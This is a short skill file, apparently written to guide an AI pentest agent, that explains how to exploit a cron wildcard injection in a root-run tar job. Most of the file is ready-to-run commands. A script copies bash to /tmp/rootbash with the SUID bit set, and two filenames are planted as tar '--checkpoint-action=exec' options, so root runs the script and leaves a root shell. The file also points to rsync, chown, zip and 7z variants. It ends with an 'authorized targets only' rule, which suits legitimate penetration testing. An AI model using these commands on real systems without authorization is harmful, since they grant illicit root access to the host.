---
name: cron-wildcard-injection
description: Exploit a CONFIRMED cron wildcard injection where a root script runs tar, rsync, chown, or similar with an unquoted wildcard in a directory you can write to.
---

# Cron wildcard injection

When a root-run command uses an unquoted wildcard (for example
`tar czf backup.tar.gz *`) in a directory you can write to, each filename is
passed as an argument. Filenames crafted to look like options become
command-line flags.

## When to use

confirmesc reports a finding like:

```
[CONFIRMED] Cron wildcard injection risk: 'tar' in /etc/cron.d/backup
```

## How to exploit (tar example)

In the writable working directory, create files whose names are tar options:

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > runme.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh runme.sh'
```

When root's `tar ... *` runs, tar executes `runme.sh` as root.

- `rsync`, `chown`, `chmod`, `zip`, and `7z` have their own option-injection
  variants. See the GTFOBins "Wildcards" notes for each.

## Verify

Have the payload create a marker as root (such as a SUID shell) and check it
after the scheduled run.

## Rules

- Authorized targets only. Remove the planted files afterwards.
